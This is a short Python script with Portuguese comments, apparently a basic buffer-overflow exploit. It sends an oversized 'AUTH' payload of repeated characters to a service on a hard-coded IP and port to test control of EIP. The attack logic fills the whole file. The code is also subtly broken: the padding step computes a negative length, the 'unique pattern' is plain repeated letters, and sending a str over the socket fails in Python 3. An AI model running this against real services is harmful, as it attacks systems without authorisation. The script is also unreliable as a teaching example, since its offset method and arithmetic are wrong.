import socket

HOST = "192.168.0.10"  # Endereço IP da máquina alvo
PORT = 5555  # Porta usada pelo serviço vulnerável

# Passo 1: Preencher o buffer com "A"s para determinar o comprimento máximo do overflow
buffer = "A" * 1100

# Passo 2: Adicionar um padrão único para encontrar o offset
buffer += "B" * 200

# Passo 3: Preencher o restante do buffer para atingir o deslocamento
buffer += "C" * (1000 - len(buffer))

# Passo 4: Adicionar "B"s adicionais para confirmar o controle do EIP
buffer += "B" * 4

# Passo 5: Enviar o payload para o serviço
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)

s.send('AUTH ' + buffer + '\r\n')
s.close()

#Este é um exploit básico que segue os passos fornecidos na explicação. Ele preenche o buffer com "A"s para determinar o comprimento máximo do #overflow, adiciona um padrão único para encontrar o offset, preenche o buffer até atingir o deslocamento, adiciona "B"s adicionais para #confirmar o controle do EIP e, finalmente, envia o payload para o serviço vulnerável. Certifique-se de substituir o endereço IP e a porta #pelo do seu ambiente de teste.





